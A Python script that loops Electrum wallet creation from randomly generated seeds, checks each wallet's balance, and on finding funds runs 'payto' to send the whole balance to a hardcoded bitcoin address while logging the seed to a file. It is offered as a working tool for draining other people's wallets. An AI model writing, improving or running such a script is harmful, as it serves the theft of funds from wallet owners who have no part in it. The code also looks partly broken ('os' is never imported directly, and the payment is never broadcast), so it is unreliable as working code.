'''
@author Mqtth3w https://github.com/mqtth3w
@license GPL-3.0
'''

import subprocess
import sys
import platform
import json
import re
from electrum_seed import *

def run(cmd):
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(result.stderr)
        sys.exit(1)
    return result.stdout.strip()

def create_wallet(wallet_path):
    print("\n\n")
    print("Creating wallet from seed...")
    seed = generate_electrum_seed("segwit")
    print(seed)
    run([
        "electrum",
        "restore",
        seed,
        "-w",
        wallet_path
    ])
    print("Wallet created at:", wallet_path)
    return seed

def electrum(info, wallet_path, args):
    print(info)
    result = run([
            "electrum",
            "-w",
            wallet_path
        ] + args)
    return result

def print_balance(cbtc, ubtc):
    green = "\033[92m"
    red = "\033[91m"
    reset = "\033[0m"
    if cbtc + ubtc > 0:
        print(f"{green}Confirmed BTC: {cbtc}{reset}")
        print(f"{red}Unconfirmed BTC: {ubtc}{reset}")
    else:
        print(f"Confirmed BTC: {cbtc}")
        print(f"Unconfirmed BTC: {ubtc}")


def get_latest_wallet_number(folder_path):
    wallet_numbers = []
    for name in os.listdir(folder_path):
        full_path = os.path.join(folder_path, name)
        if os.path.isfile(full_path):
            match = re.fullmatch(r"wallet_(\d+)", name)
            if match:
                wallet_numbers.append(int(match.group(1)))
    if not wallet_numbers:
        return 1
    return max(wallet_numbers) + 1

if __name__ == "__main__":
    stopped = False
    try:
        print("Starting electrum...")
        run([
                "electrum",
                "daemon",
                "-d"
            ])
        system = platform.system()
        base_wallet_path = ""
        if system == "Linux" or system == "Darwin":
            base_wallet_path = os.path.expanduser(f"~/.electrum/wallets")
        elif system == "Windows":
            base_wallet_path = os.path.expanduser(f"~/AppData/Roaming/Electrum/wallets")
        else:
            raise RuntimeError(f"Unsupported OS: {system}")
        latest_wallet_index = get_latest_wallet_number(base_wallet_path)
        for i in range(latest_wallet_index, 10000):
            wallet = f"{base_wallet_path}/wallet_{i}"
            seed = create_wallet(wallet)
            electrum("Loading wallet...", wallet, ["load_wallet"])
            balance = json.loads(electrum("Getting balance...", wallet, ["getbalance"]))
            confirmed = int(balance["confirmed"]) / 1e8
            unconfirmed = int(balance.get("unconfirmed", 0)) / 1e8
            print_balance(confirmed, unconfirmed)
            if confirmed + unconfirmed > 0:
                electrum("Sending coins...", wallet, ["payto", "bc1q943hmgcg28rxdvzc0yt69e829ug83htnue6pu7", "!"])
                with open("./relevant_seeds.txt", "a", encoding="utf-8") as f:
                    f.write(f"\n\n{wallet}\n{seed}\nTotal balance BTC: {confirmed + unconfirmed}")
    except KeyboardInterrupt:  
        stopped = True
    finally:
        print(f"{'Finished' if not stopped else 'Interrupt'}, stopping electrum...")
        run([
                "electrum",
                "stop"
            ])
